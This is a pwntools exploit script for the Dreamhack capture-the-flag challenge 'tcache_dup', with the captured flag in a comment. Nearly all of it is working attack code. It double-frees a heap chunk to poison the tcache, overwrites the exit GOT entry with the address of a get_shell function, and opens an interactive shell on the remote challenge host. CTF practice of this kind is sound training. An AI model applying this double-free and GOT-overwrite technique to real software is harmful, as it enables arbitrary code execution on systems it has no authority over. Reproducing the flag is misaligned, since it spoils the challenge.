from pwn import *



get_shell = 0x400ab0 
exit = 0x601038

r = process('./tcache_dup')
r = remote('host3.dreamhack.games', 21570)

def create(sz, dt):
    r.sendlineafter("> ", "1")
    r.sendlineafter(":", str(sz))
    r.sendlineafter(": ", dt)

def free(idx):
    r.sendlineafter("> ", "2")
    r.sendlineafter(": ", str(idx))

create(48, "A")
free(0)
free(0)

create(48, p64(exit))
create(48, 'B')
""" gdb.attach(r) """
""" time.sleep(1) """

create(48, p64(get_shell))

r.interactive()
# flag: DH{8fb591cfc1a2e30d0a33d53ace8e4973d40c28a4eb8d6e20581a2e8bdd393a91}

